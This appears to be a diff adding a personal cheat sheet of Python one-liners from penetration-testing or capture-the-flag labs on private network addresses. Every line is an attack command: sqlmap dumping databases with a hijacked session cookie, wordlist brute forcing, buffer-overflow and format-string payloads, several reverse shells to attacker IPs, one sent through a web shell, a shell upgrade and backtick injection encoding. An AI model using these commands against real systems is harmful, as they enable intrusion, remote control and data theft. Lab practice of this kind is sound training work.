@@ -1,0 +1,30 @@
+
+	python -m SimpleHTTPServer 8000
+	python sqlmap.py --url 192.168.0.107/imfadministrator/cms.php?pagename=home --cookie "PHPSESSID=vku9huomq3f52f9ljuqes53bn0" --level=2 -D mysql --tables --dump
+python -c print "A" * 512 | nc localhost 3333
+python dirs3arch.py -u https://192.168.0.108 -w db/dirbuster/directory-list-1.0.txt -e php
+
+python -c 'print "\x01\x01flag.txtxxxxxx"' | nc 192.168.0.109 6969  | tee flag.txt
+
+ python -c 'print "A" * 20'  | ./demo
+
+ run $(python -c 'print "A" * 268 + "B" * 4')
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.106",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+
+python wfuzz.py -c -z file,/opt/wordlists/rockyou.txt --hc 404  http://192.168.0.109:8008/NickIzL33t/FUZZ 
+
+http://192.168.56.20/shell.php?cmd=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.0.101%22,4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+python -c 'print "AAAA" + "%p."*20' | /opt/bf `python -c 'print ",>"*100'`\#
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+python snip.py | ./agent
+
+python urlencode
+import urllib
+urllib.quote_plus('`ls`')
